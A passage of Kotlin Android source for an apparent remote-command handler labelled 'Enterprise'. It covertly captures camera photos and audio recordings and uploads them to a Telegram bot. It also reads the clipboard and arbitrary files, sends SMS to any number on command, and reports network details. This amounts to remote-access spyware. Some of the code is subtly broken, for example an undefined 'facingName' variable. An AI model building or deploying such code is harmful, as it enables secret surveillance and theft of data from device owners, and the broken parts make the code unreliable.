                    if (parsedDuration == null) {
                        val firstMatch = Regex("\\d+").find(trimmed)
                        if (firstMatch != null) {
                            parsedDuration = firstMatch.value.toLongOrNull()
                        }
                    }

                    val duration = (parsedDuration ?: 1000L).coerceIn(100L, 15000L)
                    vibrateDevice(duration)
                    resultMessage = "Vibrated device for ${duration}ms."
                }
                "PLAY_ALARM", "RING", "FIND_DEVICE" -> {
                    playFindDeviceAlarm()
                    resultMessage = "Playing alarm ringtone at max volume."
                }
                "STOP_ALARM", "STOP_RING" -> {
                    stopAlarm()
                    resultMessage = "Alarm stopped."
                }
                "SHOW_TOAST", "TOAST", "SHOW_MESSAGE" -> {
                    val msg = payload.ifEmpty { "Enterprise Remote Alert" }
                    Handler(Looper.getMainLooper()).post {
                        ToastUtils.showSingleToast(context, msg, Toast.LENGTH_LONG)
                    }
                    resultMessage = "Displayed Toast message: '$msg'"
                }
                "TEXT_TO_SPEECH", "TTS", "SPEAK" -> {
                    val msg = payload.ifEmpty { "Enterprise admin notification" }
                    speakText(msg)
                    resultMessage = "Spoke Text to Speech message: '$msg'"
                }
                "SEND_SMS", "SMS_SEND" -> {
                    var recipient = ""
                    var text = ""

                    val trimmed = payload.trim()

                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            recipient = json.optString("phone").ifEmpty {
                                json.optString("recipient").ifEmpty {
                                    json.optString("number").ifEmpty {
                                        json.optString("to")
                                    }
                                }
                            }
                            text = json.optString("message").ifEmpty {
                                json.optString("text").ifEmpty {
                                    json.optString("body").ifEmpty {
                                        json.optString("payload")
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    if (recipient.isEmpty() || text.isEmpty()) {
                        if (trimmed.contains("|")) {
                            val parts = trimmed.split("|")
                            if (parts.size >= 2) {
                                val p0 = parts[0].trim()
                                val p1 = parts[1].trim()
                                if (p0.contains("=") || p1.contains("=")) {
                                    val map = parts.associate { part ->
                                        val kv = part.split("=", limit = 2)
                                        if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                    }
                                    recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
                                    text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
                                } else {
                                    recipient = p0
                                    text = parts.subList(1, parts.size).joinToString("|").trim()
                                }
                            }
                        }
                    }

                    if (recipient.isNotEmpty() && text.isNotEmpty()) {
                        try {
                            sendSmsMessage(recipient, text)
                            resultMessage = "Sent SMS to $recipient."
                        } catch (e: Exception) {
                            resultMessage = "Failed to send SMS to $recipient: ${e.message}"
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Invalid SEND_SMS payload ($payload)."
                        isSuccess = false
                    }
                }
                "GET_BATTERY_INFO", "BATTERY", "BATTERY_INFO" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Battery Level: ${info.batteryLevel}%, IsCharging: ${info.isCharging}, PlugType: ${info.chargeType}"
                }
                "GET_WIFI_DETAILS", "WIFI", "WIFI_DETAILS" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}, Public IP: ${info.publicIp}"
                }
                "GET_PUBLIC_IP", "PUBLIC_IP", "GET_IP", "IP_ADDRESS", "PUBLIC_IP_ADDRESS" -> {
                    val syncMgr = DeviceInfoSyncManager(context)
                    val publicIp = syncMgr.fetchPublicIpAddress()
                    val localIp = syncMgr.getLocalIpAddress()
                    resultMessage = "Public IP: $publicIp, Local IP: $localIp"
                }
                "GET_CLIPBOARD", "CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipText = clipManager.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard empty"
                    resultMessage = "Clipboard content: $clipText"
                }
                "SET_CLIPBOARD", "COPY_CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipData = ClipData.newPlainText("Enterprise", payload)
                    clipManager.setPrimaryClip(clipData)
                    resultMessage = "Clipboard updated with text: '$payload'"
                }
                "TOGGLE_WIFI", "WIFI_TOGGLE", "WIFI_ON", "WIFI_OFF", "SET_WIFI" -> {
                    resultMessage = handleWifiCommand(commandType, payload)
                }
                "REMOTE_CAMERA_SNAP", "CAMERA_SNAP", "CAM_SNAP", "CAPTURE_PHOTO", "TAKE_PHOTO" -> {
                    resultMessage = captureSilentCameraSnap(payload)
                }
                "REMOTE_AUDIO_RECORD", "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
                    resultMessage = recordAudioRemote(payload)
                }
                "READ_FILE", "FILE_READ", "READ_BASE64", "GET_FILE_BASE64" -> {
                    resultMessage = executeReadFileCommand(payload)
                }
                "DOWNLOAD_FILE", "FILE_DOWNLOAD", "GET_FILE", "UPLOAD_FILE", "CLOUD_DOWNLOAD", "PULL_FILE" -> {
                    resultMessage = executeDownloadFileCommand(payload)
                }
                else -> {
                    // Robust Fallback Handler for unknown or mistyped commands
                    Log.w("RemoteCommandManager", "Received unsupported or unknown command: $commandType")
                    isSuccess = false
                    resultMessage = "FALLBACK: Unknown or unsupported command type: '$commandType'. No action taken."
                }
            }
        } catch (e: Exception) {
            isSuccess = false
            resultMessage = "Command execution error: ${e.localizedMessage}"
        }

        val finalStatus = if (isSuccess) "COMPLETED" else "FAILED"
        val updated = entity.copy(
            status = finalStatus,
            executedAt = System.currentTimeMillis(),
            resultMessage = resultMessage
        )
        db.remoteCommandDao().insertCommand(updated)
        updated
    }

    private fun setFlashlight(enabled: Boolean) {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
            cameraManager.setTorchMode(cameraId, enabled)
        } catch (_: Exception) {}
    }

    private fun vibrateDevice(durationMs: Long) {
        try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(durationMs)
            }
        } catch (_: Exception) {}
    }

    private fun playFindDeviceAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            try {
                if (activeRingtone?.isPlaying == true) {
                    activeRingtone?.stop()
                }
            } catch (_: Exception) {}

            activeRingtone = RingtoneManager.getRingtone(context.applicationContext, alarmUri)?.apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    isLooping = true
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    audioAttributes = AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                }
                play()
            }
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Error playing alarm: ${e.message}")
        }
    }

    private fun stopAlarm() {
        try {
            activeRingtone?.let { ringtone ->
                try {
                    if (ringtone.isPlaying) {
                        ringtone.stop()
                    }
                } catch (_: Exception) {}
            }
            activeRingtone = null
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Error stopping alarm: ${e.message}")
        }
    }

    private fun speakText(text: String) {
        try {
            if (textToSpeech == null) {
                textToSpeech = TextToSpeech(context.applicationContext) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        textToSpeech?.language = Locale.US
                        textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
                    }
                }
            } else {
                textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
            }
        } catch (_: Exception) {}
    }

    private fun sendSmsMessage(recipient: String, text: String) {
        val hasSendSms = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasSendSms) {
            throw SecurityException("SEND_SMS permission is not granted.")
        }

        val cleanRecipient = recipient.replace("[^0-9+]".toRegex(), "").ifEmpty { recipient.trim() }
        if (cleanRecipient.isEmpty()) {
            throw IllegalArgumentException("Recipient phone number is invalid.")
        }

        val smsManager = SmsManager.getDefault()
        smsManager.sendTextMessage(cleanRecipient, null, text, null, null)
    }

    private fun handleWifiCommand(commandType: String, payload: String): String {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            ?: throw IllegalStateException("Wi-Fi Manager service unavailable.")

        val isCurrentlyEnabled = wifiManager.isWifiEnabled
        val targetState = when (commandType.uppercase()) {
            "WIFI_ON", "ENABLE_WIFI" -> true
            "WIFI_OFF", "DISABLE_WIFI" -> false
            else -> {
                val p = payload.trim().lowercase()
                if (p == "true" || p == "on" || p == "1") true
                else if (p == "false" || p == "off" || p == "0") false
                else !isCurrentlyEnabled
            }
        }

        var success = false
        try {
            @Suppress("DEPRECATION")
            success = wifiManager.setWifiEnabled(targetState)
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "setWifiEnabled exception: ${e.message}")
        }

        val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
        return "Wi-Fi toggled successfully. Current Wi-Fi state: $currentStateStr"
    }

    private suspend fun captureSilentCameraSnap(payload: String): String = withContext(Dispatchers.IO) {
        val hasCamPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        if (!hasCamPermission) {
            throw IllegalStateException("Camera permission not granted.")
        }

        var requestedFacing = "back"
        val trimmed = payload.trim()
        if (trimmed.startsWith("{")) {
            try {
                val json = JSONObject(trimmed)
                val camStr = json.optString("camera", json.optString("facing", "back")).lowercase()
                if (camStr == "front") requestedFacing = "front"
            } catch (_: Exception) {}
        } else if (trimmed.contains("front", ignoreCase = true)) {
            requestedFacing = "front"
        }

        val cameraHelper = CameraHelper(context)
        try {
            val cameraId = cameraHelper.getCameraId(requestedFacing)
            val base64Data = cameraHelper.takePhoto(cameraId) ?: throw Exception("Camera capture failed")
            
            val base64Content = base64Data.substringAfter(",")
            val bytes = Base64.decode(base64Content, Base64.NO_WRAP)

            val nowMs = System.currentTimeMillis()
            val telegramBot = TelegramBotManager(context)
            telegramBot.sendPhoto(bytes, "Captured $facingName photo (${(bytes.size / 1024)} KB)")

            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Telegram."
        } finally {
            cameraHelper.cleanup()
        }
    }

    private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
        var durationSec = 10
        val trimmed = payload.trim()
        val parsed = trimmed.filter { it.isDigit() }.toIntOrNull()
        if (parsed != null && parsed > 0) {
            durationSec = parsed
        }
        val finalDuration = durationSec.coerceAtLeast(2)

        val audioHelper = AudioRecorderHelper(context)
        try {
            val recordedFile = audioHelper.startRecordingToFile(finalDuration) 
                ?: throw Exception("Audio recording failed.")

            val audioBytes = recordedFile.readBytes()
            val telegramBot = TelegramBotManager(context)
            telegramBot.sendAudio(audioBytes, "audio_${System.currentTimeMillis()}.wav", "Duration: $finalDuration sec")

            "Successfully recorded $finalDuration seconds audio and uploaded to Telegram."
        } finally {
            audioHelper.cleanup()
        }
    }

    private fun extractFilePathOrUri(payload: String): String {
        return payload.trim()
    }

    private fun readFileData(pathOrUri: String): Pair<String, ByteArray> {
        val file = File(pathOrUri)
        val bytes = file.readBytes()
        return Pair(file.name, bytes)
    }

    private suspend fun executeReadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
        val pathOrUri = extractFilePathOrUri(payload)
        val (fileName, bytes) = readFileData(pathOrUri)
        Base64.encodeToString(bytes, Base64.NO_WRAP)
    }

    private suspend fun executeDownloadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
        val pathOrUri = extractFilePathOrUri(payload)
        val (fileName, bytes) = readFileData(pathOrUri)
        "File '$fileName' downloaded successfully."
    }
}
